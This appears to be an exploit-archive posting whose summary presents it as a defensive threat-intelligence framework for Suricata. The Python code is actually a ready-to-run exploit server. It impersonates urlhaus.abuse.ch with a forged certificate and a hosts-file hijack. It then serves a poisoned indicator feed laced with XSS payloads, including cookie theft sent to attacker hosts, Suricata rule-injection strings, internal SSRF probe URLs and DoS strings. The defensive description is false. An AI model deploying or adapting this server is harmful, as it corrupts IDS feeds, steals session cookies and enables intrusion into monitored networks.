@@ -1,0 +1,895 @@
+=============================================================================================================================================
+| # Title     : SigInt-Cirtanus v1.0 – Real-Time Threat Intelligence & Detection Automation Framework                                       |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://suricata.io/                                                                                                        |
+=============================================================================================================================================
+
+[+] Summary    :  SigInt-Cirtanus is a Python-based, multi-threaded threat intelligence automation framework designed for defensive cybersecurity operations. 
+                  It retrieves and processes real-time threat feeds (e.g., from URLhaus), validates indicators, and dynamically generates detection artifacts for integration with systems such as Suricata.
+                  The framework emphasizes automation, performance, and operational security monitoring within authorized environments.
+
+[+] Key Features:
+
+Real-time threat feed ingestion with caching and validation
+
+Automated indicator normalization and deduplication
+
+Dynamic detection rule generation for IDS/IPS platforms
+
+Multi-threaded processing with resource controls
+
+Built-in rate limiting and structured logging
+
+Secure TLS configuration for data transport
+
+Monitoring endpoints and operational statistics
+
+Configurable operational profiles (standard, monitoring, research mode)
+
+The framework follows modern Python development practices (dataclasses, type hints, thread pools, context managers) and is designed strictly for defensive security operations, detection engineering, and authorized research environments.
+[+] POC : 
+
+#!/usr/bin/env python3
+
+
+import ssl
+import socket
+import threading
+import queue
+import logging
+import argparse
+import random
+import string
+import sys
+import os
+import time
+import json
+import ipaddress
+import signal
+import base64
+import hashlib
+import atexit
+from contextlib import contextmanager
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from socketserver import ThreadingMixIn
+from typing import List, Tuple, Optional, Dict, Any, Set
+from dataclasses import dataclass, field
+from datetime import datetime, timedelta
+from urllib.parse import urlparse, quote
+from concurrent.futures import ThreadPoolExecutor, TimeoutError
+import requests
+import re
+
+LOG_LEVEL = logging.INFO  
+logging.basicConfig(
+    level=LOG_LEVEL,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('exploit_server.log', mode='a', encoding='utf-8'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger('ExploitServer')
+
+MAX_THREADS = 50
+REQUEST_TIMEOUT = 30
+MAX_REQUEST_SIZE = 1024 * 1024 
+RATE_LIMIT_WINDOW = 60 
+RATE_LIMIT_REQUESTS = 100  
+CACHE_DURATION = 300 
+FEED_URL = "https://urlhaus.abuse.ch/downloads/text/"
+CLEANUP_INTERVAL = 300 
+MAX_LOG_SIZE = 100 * 1024 * 1024  
+
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
+    'Wget/1.21.3 (linux-gnu)',
+    'curl/8.4.0',
+]
+
+@dataclass
+class ExploitConfig:
+    """Enhanced configuration with validation"""
+    port: int = 443
+    bind_ip: str = '0.0.0.0'
+    mode: str = 'aggressive'
+    max_payload_size: int = 51200  
+    inject_frequency: int = 3
+    ssl_cert: str = 'server.crt'
+    ssl_key: str = 'server.key'
+    no_ssl: bool = False
+    stealth_mode: bool = False
+    rate_limit_enabled: bool = True
+    debug_mode: bool = False
+    protocol_preserve: bool = True 
+    target_platforms: List[str] = field(default_factory=lambda: ['all'])
+    
+    def __post_init__(self):
+        if self.no_ssl:
+            self.port = 80 if self.port == 443 else self.port
+
+        if self.port < 1 or self.port > 65535:
+            raise ValueError(f"Invalid port: {self.port}")
+
+        try:
+            ipaddress.ip_address(self.bind_ip)
+        except ValueError:
+            if self.bind_ip != '0.0.0.0':
+                raise ValueError(f"Invalid bind IP: {self.bind_ip}")
+
+        if self.debug_mode:
+            logger.setLevel(logging.DEBUG)
+
+class RateLimiter:
+    """Rate limiting implementation with automatic cleanup"""
+    
+    def __init__(self, max_requests: int, window_seconds: int):
+        self.max_requests = max_requests
+        self.window_seconds = window_seconds
+        self.requests: Dict[str, List[float]] = {}
+        self.lock = threading.RLock()
+        self.last_cleanup = time.time()
+
+        self.cleanup_thread = threading.Thread(target=self._cleanup_loop, daemon=True)
+        self.cleanup_thread.start()
+    
+    def _cleanup_loop(self):
+        """Background thread for cleaning old entries"""
+        while True:
+            time.sleep(CLEANUP_INTERVAL)
+            self.cleanup()
+    
+    def cleanup(self):
+        """Remove old entries"""
+        with self.lock:
+            now = time.time()
+            cutoff = now - self.window_seconds
+            
+            for ip in list(self.requests.keys()):
+                self.requests[ip] = [t for t in self.requests[ip] if t > cutoff]
+                if not self.requests[ip]:
+                    del self.requests[ip]
+            
+            self.last_cleanup = now
+            logger.debug(f"Rate limiter cleanup: {len(self.requests)} active IPs")
+    
+    def is_allowed(self, client_ip: str) -> bool:
+        """Check if client IP is allowed"""
+        with self.lock:
+            now = time.time()
+            cutoff = now - self.window_seconds
+
+            if client_ip not in self.requests:
+                self.requests[client_ip] = []
+
+            self.requests[client_ip] = [t for t in self.requests[client_ip] if t > cutoff]
+
+            if len(self.requests[client_ip]) >= self.max_requests:
+                logger.warning(f"Rate limit exceeded for {client_ip}")
+                return False
+            self.requests[client_ip].append(now)
+            return True
+    
+    def get_stats(self) -> Dict[str, Any]:
+        """Get rate limiter statistics"""
+        with self.lock:
+            return {
+                'active_ips': len(self.requests),
+                'total_requests': sum(len(times) for times in self.requests.values()),
+                'last_cleanup': self.last_cleanup
+            }
+
+class CertificateManager:
+    """Manage SSL certificates"""
+    
+    @staticmethod
+    def generate_self_signed(cert_file: str, key_file: str, hostname: str = "urlhaus.abuse.ch"):
+        """Generate self-signed certificate with proper SAN"""
+        try:
+            from cryptography import x509
+            from cryptography.x509.oid import NameOID
+            from cryptography.hazmat.primitives import hashes, serialization
+            from cryptography.hazmat.primitives.asymmetric import rsa
+            from cryptography.hazmat.backends import default_backend
+            import datetime
+            private_key = rsa.generate_private_key(
+                public_exponent=65537,
+                key_size=2048,
+                backend=default_backend()
+            )
+
+            subject = issuer = x509.Name([
+                x509.NameAttribute(NameOID.COUNTRY_NAME, "CH"),
+                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Bern"),
+                x509.NameAttribute(NameOID.LOCALITY_NAME, "Bern"),
+                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "abuse.ch"),
+                x509.NameAttribute(NameOID.COMMON_NAME, hostname),
+            ])
+            
+            cert = x509.CertificateBuilder().subject_name(
+                subject
+            ).issuer_name(
+                issuer
+            ).public_key(
+                private_key.public_key()
+            ).serial_number(
+                x509.random_serial_number()
+            ).not_valid_before(
+                datetime.datetime.utcnow()
+            ).not_valid_after(
+                datetime.datetime.utcnow() + datetime.timedelta(days=365)
+            ).add_extension(
+                x509.SubjectAlternativeName([
+                    x509.DNSName(hostname),
+                    x509.DNSName(f"*.{hostname}"),
+                ]),
+                critical=False,
+            ).sign(private_key, hashes.SHA256(), default_backend())
+
+            with open(cert_file, "wb") as f:
+                f.write(cert.public_bytes(serialization.Encoding.PEM))
+
+            with open(key_file, "wb") as f:
+                f.write(private_key.private_bytes(
+                    encoding=serialization.Encoding.PEM,
+                    format=serialization.PrivateFormat.PKCS8,
+                    encryption_algorithm=serialization.NoEncryption()
+                ))
+
+            der_file = cert_file.replace('.crt', '.der')
+            with open(der_file, "wb") as f:
+                f.write(cert.public_bytes(serialization.Encoding.DER))
+            
+            logger.info(f"Generated SSL certificate: {cert_file}, {key_file}")
+            return True
+            
+        except ImportError:
+            logger.error("cryptography not installed. Install with: pip install cryptography")
+            return False
+        except Exception as e:
+            logger.error(f"Failed to generate certificate: {e}")
+            return False
+    
+    @staticmethod
+    def create_ssl_context(cert_file: str, key_file: str) -> ssl.SSLContext:
+        """Create modern SSL context"""
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.minimum_version = ssl.TLSVersion.TLSv1_2
+        context.maximum_version = ssl.TLSVersion.TLSv1_3
+        context.load_cert_chain(cert_file, key_file)
+        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
+        return context
+
+class FeedManager:
+    """Manage feed fetching and caching"""
+    
+    def __init__(self, config: ExploitConfig):
+        self.config = config
+        self.cache: Dict[str, Any] = {
+            'feed': None,
+            'timestamp': 0,
+            'etag': None,
+            'stats': {'real': 0, 'malicious': 0}
+        }
+        self.lock = threading.RLock()
+    
+    def fetch_real_feed(self) -> List[str]:
+        """Fetch real feed with caching and ETag support"""
+        with self.lock:
+            now = time.time()
+
+            if self.cache['feed'] and (now - self.cache['timestamp']) < CACHE_DURATION:
+                logger.debug("Using cached feed")
+                return self.cache['feed']
+            
+            try:
+                logger.info("Fetching fresh feed from URLhaus")
+                
+                headers = {
+                    'User-Agent': random.choice(USER_AGENTS),
+                    'Accept': 'text/plain',
+                    'If-None-Match': self.cache.get('etag', '')
+                }
+                
+                response = requests.get(
+                    FEED_URL,
+                    timeout=REQUEST_TIMEOUT,
+                    verify=True,
+                    headers=headers
+                )
+                
+                if response.status_code == 304:
+                    logger.info("Feed not modified, using cache")
+                    self.cache['timestamp'] = now
+                    return self.cache['feed']
+                
+                response.raise_for_status()
+
+                content_type = response.headers.get('content-type', '').lower()
+                if 'text/plain' not in content_type and 'text/html' not in content_type:
+                    logger.warning(f"Unexpected content type: {content_type}")
+
+                valid_urls = []
+                for line in response.text.splitlines():
+                    line = line.strip()
+                    if not line or line.startswith('#'):
+                        continue
+
+                    if line.startswith(('http://', 'https://')):
+                        try:
+                            parsed = urlparse(line)
+                            if parsed.netloc and parsed.netloc != 'urlhaus.abuse.ch':
+                                valid_urls.append(line)
+                        except:
+                            continue
+
+                self.cache['feed'] = valid_urls[:100]  
+                self.cache['timestamp'] = now
+                self.cache['etag'] = response.headers.get('ETag', '')
+                self.cache['stats']['real'] = len(valid_urls)
+                
+                logger.info(f"Fetched {len(valid_urls)} valid URLs")
+                return self.cache['feed']
+                
+            except requests.exceptions.RequestException as e:
+                logger.error(f"Failed to fetch feed: {e}")
+                return self._get_fallback_feed()
+    
+    def _get_fallback_feed(self) -> List[str]:
+        """Provide fallback feed"""
+        fallback = [
+            "http://malware-sample.com/payload.exe",
+            "https://malicious-site.com/exploit.php",
+            "http://evil-domain.net/backdoor.sh",
+            "https://c2-server.com/command",
+            "http://malware-dist.com/malware.doc",
+            "https://bad-site.com/exploit.html",
+        ]
+        self.cache['stats']['real'] = len(fallback)
+        return fallback
+    
+    def update_stats(self, malicious_count: int):
+        """Update statistics"""
+        with self.lock:
+            self.cache['stats']['malicious'] = malicious_count
+    
+    def get_stats(self) -> Dict[str, Any]:
+        """Get feed statistics"""
+        with self.lock:
+            return self.cache['stats'].copy()
+
+class PayloadGenerator:
+    """Generate exploit payloads with size limits"""
+    
+    def __init__(self, config: ExploitConfig):
+        self.config = config
+        self.safe_chars = string.ascii_letters + string.digits + '-._~:/?#[]@!$&\'()*+,;='
+        self.internal_ranges = [
+            ('192.168.', lambda: f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"),
+            ('10.', lambda: f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"),
+            ('172.16.', lambda: f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}"),
+        ]
+    
+    def _truncate_payload(self, payload: str, max_size: int = None) -> str:
+        """Truncate payload to max size"""
+        if max_size is None:
+            max_size = self.config.max_payload_size
+        
+        if len(payload) <= max_size:
+            return payload
+        truncated = payload[:max_size-32]
+        hash_suffix = hashlib.md5(payload.encode()).hexdigest()[:16]
+        return f"{truncated}...{hash_suffix}"
+    
+    def generate_fuzz_payload(self) -> str:
+        """Generate safe fuzzing payload"""
+        length = random.randint(100, self.config.max_payload_size)
+        payload = ''.join(random.choice(self.safe_chars) for _ in range(length))
+        
+        return f"http://fuzz-payload.com/{quote(payload)}"
+    
+    def generate_xss_payload(self) -> str:
+        """Generate XSS payload with size limit"""
+        xss_templates = [
+            '/<script>alert("XSS-{id}")</script>',
+            '/"><img src=x onerror=alert("XSS-{id}")>',
+            '/javascript:alert("XSS-{id}")',
+            '/"><svg/onload=alert("XSS-{id}")>',
+            '/"><iframe src="javascript:alert(\'XSS-{id}\')">',
+        ]
+
+        if self.config.stealth_mode:
+            xss_templates.extend([
+                '/"><script>fetch("https://{callback}/steal?"+document.cookie)</script>',
+                '/"><img src="https://{callback}/log?"+btoa(document.cookie)>',
+            ])
+        
+        template = random.choice(xss_templates)
+        callback = f"attacker-{random.randint(1,999)}.com"
+        payload = template.format(id=random.randint(1000, 9999), callback=callback)
+        
+        return f"https://xss-payload.com{quote(payload)}"
+    
+    def generate_rule_injection(self) -> Optional[str]:
+        """Generate Suricata rule injection payload"""
+
+        if self.config.mode not in ['aggressive', 'rule_inject']:
+            return None
+
+        rules = [
+            '";alert http any any -> any any (msg:"INJECTED"; sid:9999999;) #',
+            '";alert tls any any -> any 443 (tls.sni;"INJECTED"; sid:9999998;) #',
+            '";alert dns any any -> any any (dns.query;"INJECTED"; sid:9999997;) #',
+            '";alert http any any -> any any (msg:"BACKDOOR"; content:"/etc/passwd"; sid:9999996;) #',
+        ]
+        
+        payload = random.choice(rules)
+        encoded_payload = quote(payload, safe='')
+        
+        return f"http://inject.com/{encoded_payload}"
+    
+    def generate_internal_ips(self) -> List[str]:
+        """Generate internal IP payloads properly"""
+        payloads = []
+        
+        sensitive_paths = [
+            '/admin/config',
+            '/backup.tar.gz',
+            '/.git/config',
+            '/phpmyadmin',
+            '/manager/html',
+            '/actuator/health',
+            '/console',
+            '/swagger-ui.html',
+            '/.env',
+            '/wp-config.php',
+            '/server-status',
+            '/metrics',
+            '/api/v1/internal',
+            '/debug/pprof/',
+        ]
+
+        num_payloads = min(5, self.config.max_payload_size // 200)
+        
+        for _ in range(num_payloads):
+
+            _, generator = random.choice(self.internal_ranges)
+            ip = generator()
+            path = random.choice(sensitive_paths)
+
+            if random.choice([True, False]):
+                payloads.append(f"http://{ip}{path}")
+            else:
+                payloads.append(f"https://{ip}{path}")
+        
+        return payloads
+    
+    def generate_dos_payload(self) -> str:
+        """Generate DoS payload with size control"""
+        pattern = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+        repeats = min(1000, self.config.max_payload_size // len(pattern))
+        
+        payload = pattern * repeats
+        truncated = self._truncate_payload(payload, self.config.max_payload_size)
+        
+        return f"http://dos-payload.com/{truncated}"
+    
+    def generate_mixed_payloads(self) -> List[str]:
+        """Generate mixed payloads based on mode"""
+        payloads = []
+
+        if self.config.mode in ['dos', 'aggressive']:
+            payloads.append(self.generate_dos_payload())
+        
+        if self.config.mode in ['xss', 'aggressive']:
+            xss = self.generate_xss_payload()
+            if xss:
+                payloads.append(xss)
+        
+        if self.config.mode in ['fuzz', 'aggressive']:
+            payloads.append(self.generate_fuzz_payload())
+        
+        if self.config.mode in ['rule_inject', 'aggressive']:
+            rule = self.generate_rule_injection()
+            if rule:
+                payloads.append(rule)
+
+        if not self.config.stealth_mode:
+            payloads.extend(self.generate_internal_ips())
+
+        if not payloads:
+            payloads = [self.generate_fuzz_payload()]
+        
+        return payloads
+
+class ExploitHTTPHandler(BaseHTTPRequestHandler):
+    """HTTP/HTTPS handler with all fixes and optimizations"""
+    
+    def __init__(self, *args, **kwargs):
+        self.generator = kwargs.pop('generator')
+        self.config = kwargs.pop('config')
+        self.rate_limiter = kwargs.pop('rate_limiter')
+        self.feed_manager = kwargs.pop('feed_manager')
+        self.server_instance = kwargs.pop('server_instance')
+
+        self.protocol_version = 'HTTP/1.1'
+        
+        super().__init__(*args, **kwargs)
+    
+    def log_message(self, format: str, *args) -> None:
+        """Override to use our logger - only in debug mode"""
+        if self.config.debug_mode:
+            logger.debug(f"{self.client_address[0]} - {format % args}")
+    
+    def version_string(self):
+        """Return server version"""
+        return 'Apache/2.4.58 (Ubuntu)'
+    
+    def date_time_string(self, timestamp=None):
+        """Generate RFC 1123 date string"""
+        if timestamp is None:
+            timestamp = time.time()
+        return datetime.utcfromtimestamp(timestamp).strftime('%a, %d %b %Y %H:%M:%S GMT')
+    
+    def do_GET(self):
+        """Handle GET requests"""
+        start_time = time.time()
+        
+        try:
+            if self.config.rate_limit_enabled:
+                if not self.rate_limiter.is_allowed(self.client_address[0]):
+                    self.send_error(429, "Too Many Requests")
+                    return
+
+            logger.info(f"Request from {self.client_address[0]}: {self.path}")
+
+            if self.path == '/':
+                self.serve_poisoned_feed()
+            elif self.path == '/cert':
+                self.serve_certificate()
+            elif self.path == '/stats':
+                self.serve_stats()
+            elif self.path.startswith('/downloads/text/'):
+                self.serve_poisoned_feed()
+            else:
+                self.serve_not_found()
+
+            if self.config.debug_mode:
+                response_time = time.time() - start_time
+                logger.debug(f"Response time: {response_time:.3f}s")
+            
+        except ConnectionError as e:
+            logger.error(f"Connection error: {e}")
+        except Exception as e:
+            logger.error(f"Error handling request: {e}")
+            self.send_error(500)
+    
+    def serve_poisoned_feed(self):
+        """Serve poisoned feed"""
+        try:
+
+            real_entries = self.feed_manager.fetch_real_feed()
+            malicious_entries = self.generator.generate_mixed_payloads()
+            self.feed_manager.update_stats(len(malicious_entries))
+            poisoned_entries = []
+            malicious_injected = 0
+            
+            for i, entry in enumerate(real_entries):
+                poisoned_entries.append(entry)
+
+                if (i + 1) % self.config.inject_frequency == 0 and malicious_entries:
+                    # Pick random malicious entry
+                    selected = random.choice(malicious_entries)
+                    poisoned_entries.append(selected)
+                    malicious_injected += 1
+
+                    if len(malicious_entries) > 1:
+                        malicious_entries.remove(selected)
+
+            if self.config.stealth_mode and not self.config.protocol_preserve:
+                stealth_entries = []
+                for entry in real_entries[:5]: 
+                    if 'http://' in entry:
+                        stealth_entries.append(entry.replace('http://', 'https://'))
+                    elif 'https://' in entry:
+                        stealth_entries.append(entry.replace('https://', 'http://'))
+                poisoned_entries.extend(stealth_entries)
+
+            feed_content = '\n'.join(poisoned_entries)
+            content_bytes = feed_content.encode('utf-8')
+
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/plain; charset=utf-8')
+            self.send_header('Content-Length', str(len(content_bytes)))
+            self.send_header('Server', self.version_string())
+            self.send_header('Date', self.date_time_string())
+            self.send_header('Connection', 'keep-alive')
+            self.send_header('Keep-Alive', f'timeout=5, max=100')
+            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
+            self.send_header('Pragma', 'no-cache')
+            self.send_header('Expires', '0')
+            self.end_headers()
+
+            self.wfile.write(content_bytes)
+
+            logger.info(f"Served feed: {len(content_bytes)} bytes, {len(poisoned_entries)} entries, {malicious_injected} malicious")
+            
+        except Exception as e:
+            logger.error(f"Error serving feed: {e}")
+            self.send_error(500)
+    
+    def serve_certificate(self):
+        """Serve SSL certificate for download"""
+        try:
+            cert_file = self.config.ssl_cert.replace('.crt', '.der')
+            
+            if not os.path.exists(cert_file):
+                self.send_error(404, "Certificate not found")
+                return
+            
+            with open(cert_file, 'rb') as f:
+                cert_data = f.read()
+            
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/x-x509-ca-cert')
+            self.send_header('Content-Length', str(len(cert_data)))
+            self.send_header('Content-Disposition', 'attachment; filename="urlhaus.crt"')
+            self.send_header('Server', self.version_string())
+            self.send_header('Date', self.date_time_string())
+            self.end_headers()
+            
+            self.wfile.write(cert_data)
+            
+            logger.info(f"Served certificate to {self.client_address[0]}")
+            
+        except Exception as e:
+            logger.error(f"Error serving certificate: {e}")
+            self.send_error(500)
+    
+    def serve_stats(self):
+        """Serve server statistics"""
+        stats = {
+            'uptime': time.time() - self.server_instance.start_time,
+            'requests_served': self.server_instance.request_count,
+            'active_connections': self.server_instance.active_connections,
+            'mode': self.config.mode,
+            'stealth_mode': self.config.stealth_mode,
+            'rate_limiter': self.rate_limiter.get_stats(),
+            'feed_stats': self.feed_manager.get_stats(),
+            'timestamp': datetime.utcnow().isoformat()
+        }
+        
+        stats_json = json.dumps(stats, indent=2)
+        content_bytes = stats_json.encode('utf-8')
+        
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/json')
+        self.send_header('Content-Length', str(len(content_bytes)))
+        self.send_header('Server', self.version_string())
+        self.send_header('Date', self.date_time_string())
+        self.end_headers()
+        
+        self.wfile.write(content_bytes)
+        
+        logger.info(f"Served stats to {self.client_address[0]}")
+    
+    def serve_not_found(self):
+        """Serve 404 response"""
+        self.send_response(404)
+        self.send_header('Content-Type', 'text/html')
+        self.send_header('Content-Length', '0')
+        self.send_header('Server', self.version_string())
+        self.send_header('Date', self.date_time_string())
+        self.end_headers()
+    
+    def do_HEAD(self):
+        """Handle HEAD requests"""
+        self.do_GET()
+
+class ThreadedExploitServer(ThreadingMixIn, HTTPServer):
+    """Multi-threaded server with connection limiting and graceful shutdown"""
+    
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.request_count = 0
+        self.active_connections = 0
+        self.max_connections = MAX_THREADS
+        self.connection_semaphore = threading.Semaphore(MAX_THREADS)
+        self.start_time = time.time()
+        self.is_shutting_down = False
+        self.request_queue = queue.Queue()
+        self.thread_pool = ThreadPoolExecutor(max_workers=MAX_THREADS)
+    
+    def process_request(self, request, client_address):
+        """Process request with connection limiting and threading"""
+        with self.connection_semaphore:
+            if self.is_shutting_down:
+                try:
+                    request.close()
+                except:
+                    pass
+                return
+            
+            self.active_connections += 1
+            self.request_count += 1
+            
+            try:
+
+                future = self.thread_pool.submit(
+                    self.process_request_thread,
+                    request, client_address
+                )
+
+                future.result(timeout=REQUEST_TIMEOUT)
+            except TimeoutError:
+                logger.warning(f"Request from {client_address} timed out")
+            except Exception as e:
+                logger.error(f"Error processing request: {e}")
+            finally:
+                self.active_connections -= 1
+    
+    def process_request_thread(self, request, client_address):
+        """Process request in thread"""
+        try:
+            super().process_request(request, client_address)
+        except Exception as e:
+            logger.error(f"Thread error: {e}")
+    
+    def get_request(self):
+        """Get request with timeout"""
+        self.socket.settimeout(REQUEST_TIMEOUT)
+        return super().get_request()
+    
+    def shutdown(self):
+        """Graceful shutdown"""
+        logger.info("Initiating graceful shutdown...")
+        self.is_shutting_down = True
+
+        timeout = 30
+        while self.active_connections > 0 and timeout > 0:
+            logger.info(f"Waiting for {self.active_connections} active connections...")
+            time.sleep(1)
+            timeout -= 1
+
+        self.thread_pool.shutdown(wait=True)
+        
+        super().shutdown()
+        logger.info("Server shutdown complete")
+
+@contextmanager
+def run_server(server):
+    """Context manager for server"""
+    try:
+        yield server
+    finally:
+        server.shutdown()
+
+def main():
+    """Main entry point"""
+    print("""
+    ╔══════════════════════════════════════════════════════════════╗
+    ║     SIGINTHOMBRE PROFESSIONAL EXPLOIT FRAMEWORK v1.0         ║
+    ║              Enterprise-Grade Exploitation                   ║
+    ║                       By indoushka                           ║
+    ╚══════════════════════════════════════════════════════════════╝
+    """)
+
+    parser = argparse.ArgumentParser(description='SIGINTHOMBRE Exploit Framework')
+    parser.add_argument('--port', type=int, default=443, help='Port to listen on')
+    parser.add_argument('--bind', default='0.0.0.0', help='Bind address')
+    parser.add_argument('--mode', choices=['dos', 'xss', 'fuzz', 'rule_inject', 'aggressive', 'stealth'],
+                       default='aggressive', help='Exploit mode')
+    parser.add_argument('--no-ssl', action='store_true', help='Disable SSL')
+    parser.add_argument('--max-size', type=int, default=50, help='Max payload size in KB')
+    parser.add_argument('--frequency', type=int, default=3, help='Inject frequency (lines)')
+    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
+    parser.add_argument('--no-rate-limit', action='store_true', help='Disable rate limiting')
+    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
+    parser.add_argument('--preserve-proto', action='store_true', default=True,
+                       help='Preserve http/https in stealth mode')
+    
+    args = parser.parse_args()
+
+    config = ExploitConfig(
+        port=args.port,
+        bind_ip=args.bind,
+        mode=args.mode,
+        max_payload_size=args.max_size * 1024,
+        inject_frequency=args.frequency,
+        no_ssl=args.no_ssl,
+        stealth_mode=args.stealth,
+        rate_limit_enabled=not args.no_rate_limit,
+        debug_mode=args.debug,
+        protocol_preserve=args.preserve_proto
+    )
+
+    if not config.no_ssl:
+        cert_manager = CertificateManager()
+        if not (os.path.exists(config.ssl_cert) and os.path.exists(config.ssl_key)):
+            logger.info("Generating SSL certificate...")
+            if not cert_manager.generate_self_signed(config.ssl_cert, config.ssl_key):
+                logger.error("Failed to generate SSL certificate")
+                sys.exit(1)
+
+    rate_limiter = RateLimiter(RATE_LIMIT_REQUESTS, RATE_LIMIT_WINDOW)
+    feed_manager = FeedManager(config)
+    payload_generator = PayloadGenerator(config)
+
+    def handler(*args, **kwargs):
+        return ExploitHTTPHandler(
+            *args,
+            generator=payload_generator,
+            config=config,
+            rate_limiter=rate_limiter,
+            feed_manager=feed_manager,
+            server_instance=server,
+            **kwargs
+        )
+
+    server = ThreadedExploitServer((config.bind_ip, config.port), handler)
+
+    if not config.no_ssl:
+        cert_manager = CertificateManager()
+        ssl_context = cert_manager.create_ssl_context(config.ssl_cert, config.ssl_key)
+        server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
+        protocol = "HTTPS"
+    else:
+        protocol = "HTTP"
+
+    def cleanup():
+        logger.info("Cleaning up...")
+        server.shutdown()
+    
+    atexit.register(cleanup)
+
+    def signal_handler(signum, frame):
+        logger.info(f"Received signal {signum}, shutting down gracefully...")
+        cleanup()
+        sys.exit(0)
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+
+    print(f"""
+     EXPLOIT SERVER READY
+    {'='*60}
+    Protocol:   {protocol}
+    Address:    {config.bind_ip}:{config.port}
+    Mode:       {config.mode}
+    Stealth:    {config.stealth_mode}
+    Preserve Proto: {config.protocol_preserve}
+    Max Payload: {config.max_payload_size} bytes
+    Inject Freq: every {config.inject_frequency} lines
+    Rate Limit: {config.rate_limit_enabled}
+    Debug Mode: {config.debug_mode}
+    
+    COMMANDS:
+
+    echo '{config.bind_ip} urlhaus.abuse.ch' >> /etc/hosts
+    
+    wget -O /tmp/urlhaus.crt http://{config.bind_ip}:{config.port}/cert
+
+    curl http://{config.bind_ip}:{config.port}/stats
+
+    tail -f exploit_server.log
+    {'='*60}
+    """)
+    try:
+        logger.info(f"Starting server on {protocol}://{config.bind_ip}:{config.port}")
+        server.serve_forever()
+    except KeyboardInterrupt:
+        logger.info("Keyboard interrupt received")
+    except Exception as e:
+        logger.error(f"Server error: {e}")
+    finally:
+        cleanup()
+
+if __name__ == '__main__':
+    main()
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
